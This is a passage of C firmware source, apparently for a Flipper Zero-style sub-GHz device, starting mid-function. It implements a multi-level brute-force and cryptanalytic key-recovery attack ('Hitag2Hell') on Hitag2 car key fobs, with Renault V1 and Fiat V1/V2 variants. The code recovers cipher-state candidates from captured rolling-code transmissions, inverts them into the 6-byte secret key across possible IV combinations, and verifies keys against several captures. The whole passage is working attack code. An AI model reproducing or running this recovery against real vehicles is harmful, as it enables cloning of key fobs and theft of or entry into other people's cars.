        if(cap->is_renault_v1) {
            // [HITAG2_BF] Renault V1: the 32-bit hop feeding the Hitag2Hell
            // recovery depends on BOTH the hop bit-slice AND (for inversion) the
            // IV combo. state31 is recovered from the hop, which depends on the
            // slice, so hitag2_hell_recover() must run PER SLICE (each slice is a
            // different hop -> different state31 candidate set). Inside each
            // slice's candidates we then invert once per IV combo and let the
            // multi-capture verifier (which itself searches all slice/combo pairs
            // across all captures) confirm the winner. 3 slices x 4 combos = 12
            // iterations per candidate — acceptable versus the L0 sweep cost.
            for(uint8_t slice = 0; slice < RENAULT_V1_HOP_SLICE_COUNT; slice++) {
                if(instance->cancel) return false;
                uint32_t hop = subghz_protocol_renault_v1_candidate_hop(cap->payload42, slice);

                Hitag2HellResult result;
                memset(&result, 0, sizeof(result));
                if(hitag2_hell_recover(hop, &cfg, &result)) {
                    for(uint32_t i = 0; i < result.candidate_count; i++) {
                        if(instance->cancel) return false;
                        uint8_t key[6];
                        bool found_here = false;
                        for(uint8_t combo = 0; combo < RENAULT_V1_IV_COMBO_COUNT; combo++) {
                            uint8_t btn_c =
                                subghz_protocol_renault_v1_iv_button(cap->rv1_button, combo);
                            uint16_t ctrl_c =
                                subghz_protocol_renault_v1_iv_control(cap->rv1_counter, combo);
                            if(!hitag2_fiat_invert_init(
                                   result.candidates[i], cap->uid, btn_c, ctrl_c, 0, key)) {
                                continue;
                            }
                            // Multi-capture cross-validation. The resolver
                            // requires a SINGLE (slice, combo) to validate all
                            // Renault V1 captures.
                            if(subghz_hitag2_bf_verify_multi_resolve(instance, key, 0)) {
                                memcpy(instance->found_key, key, 6);
                                instance->found_epoch = 0;
                                instance->found_level = SubGhzHitag2BfLevelHitag2Hell;
                                instance->found = true;
                                found_here = true;
                                break;
                            }
                        }
                        if(found_here) return true;
                    }
                }
                if(result.cancelled) {
                    instance->cancel = true;
                    return false;
                }
            }
            continue;
        }

        Hitag2HellResult result;
        memset(&result, 0, sizeof(result));

        if(hitag2_hell_recover(cap->hop, &cfg, &result)) {
            // Try each candidate: invert to key, verify against all captures.
            // The state31 recovered from `hop` is IV-independent, but the
            // init-phase inversion that turns state31 into the 6-byte key DOES
            // depend on the IV (button, control). For Fiat V1 the IV is known;
            // for Fiat V2 it is one of 4 combos, so we invert once per combo and
            // let the multi-capture verifier confirm the winner.
            for(uint32_t i = 0; i < result.candidate_count; i++) {
                if(instance->cancel) return false;
                uint8_t key[6];

                if(cap->is_fiat_v2) {
                    bool found_here = false;
                    for(uint8_t combo = 0; combo < FIAT_V2_IV_COMBO_COUNT; combo++) {
                        uint8_t btn_c =
                            subghz_protocol_fiat_v2_iv_button_for_combo(cap->raw, combo);
                        uint16_t ctrl_c =
                            subghz_protocol_fiat_v2_iv_control_for_combo(cap->raw, combo);
                        if(!hitag2_fiat_invert_init(
                               result.candidates[i], cap->uid, btn_c, ctrl_c, 0, key)) {
                            continue;
                        }
                        // Multi-capture cross-validation. The resolver requires a
                        // SINGLE combo to validate all V2 captures; the combo that
                        // produced this key must be that same winning combo.
                        if(subghz_hitag2_bf_verify_multi_resolve(instance, key, 0)) {
                            memcpy(instance->found_key, key, 6);
                            instance->found_epoch = 0;
                            instance->found_level = SubGhzHitag2BfLevelHitag2Hell;
                            instance->found = true;
                            found_here = true;
                            break;
                        }
                    }
                    if(found_here) return true;
                } else {
                    if(!hitag2_fiat_invert_init(
                           result.candidates[i],
                           cap->uid,
                           cap->button,
                           cap->control,
                           0, // epoch = 0 (Fiat V1 default)
                           key)) {
                        continue;
                    }
                    // Multi-capture cross-validation
                    if(subghz_hitag2_bf_verify_multi_resolve(instance, key, 0)) {
                        memcpy(instance->found_key, key, 6);
                        instance->found_epoch = 0;
                        instance->found_level = SubGhzHitag2BfLevelHitag2Hell;
                        instance->found = true;
                        return true;
                    }
                }
            }
        }

        if(result.cancelled) {
            instance->cancel = true;
            return false;
        }
    }
    return false;
}

static bool subghz_hitag2_bf_run_l5(
    SubGhzHitag2Bf* instance,
    SubGhzHitag2BfProgressCallback progress_cb,
    void* context) {
    // Run the attack on the first capture. Multi-capture validation happens
    // per-candidate inside subghz_hitag2_bf_try_hell_on_capture(). Running the
    // attack on additional captures would multiply the wall time without much
    // gain (candidates from cap[0] already include the true key).
    if(instance->capture_count == 0) return false;
    // Emit an initial L5 frame so the UI switches from "L4 100%" to
    // "Hitag2Hell 0%" immediately, instead of appearing frozen on L4 during the
    // first (minutes-long on M4) computation window before the kernel's own
    // progress callback fires.
    if(progress_cb) {
        progress_cb(
            SubGhzHitag2BfLevelHitag2Hell,
            "Hitag2Hell",
            0,
            instance->keys_tested_total,
            context);
    }
    return subghz_hitag2_bf_try_hell_on_capture(
        instance, &instance->captures[0], progress_cb, context);
}

// -----------------------------------------------------------------------------
// Public run entry point
// -----------------------------------------------------------------------------

bool subghz_hitag2_bf_run(
    SubGhzHitag2Bf* instance,
    SubGhzHitag2BfProgressCallback progress_cb,
    void* context) {
    furi_check(instance);
    if(instance->capture_count == 0) return false;

    instance->cancel = false;
    instance->found = false;
    instance->keys_tested_total = 0;

    // L1
    if(instance->levels_mask & (1U << SubGhzHitag2BfLevelKnown)) {
        if(subghz_hitag2_bf_run_l1(instance, progress_cb, context)) return true;
        if(instance->cancel) return false;
    }
    // L2
    if(instance->levels_mask & (1U << SubGhzHitag2BfLevelFlashDict)) {
        if(subghz_hitag2_bf_run_l2(instance, progress_cb, context)) return true;
        if(instance->cancel) return false;
    }
    // L3
    if(instance->levels_mask & (1U << SubGhzHitag2BfLevelSDDict)) {
        if(subghz_hitag2_bf_run_l3(instance, progress_cb, context)) return true;
        if(instance->cancel) return false;
    }
    // L4
    if(instance->levels_mask & (1U << SubGhzHitag2BfLevelHeuristic)) {
        if(subghz_hitag2_bf_run_l4(instance, progress_cb, context)) return true;
        if(instance->cancel) return false;
    }
    // L5 (only if we have >=1 capture, and better with >=2 captures)
    if(instance->levels_mask & (1U << SubGhzHitag2BfLevelHitag2Hell)) {
        if(subghz_hitag2_bf_run_l5(instance, progress_cb, context)) return true;
    }

    return false;
}
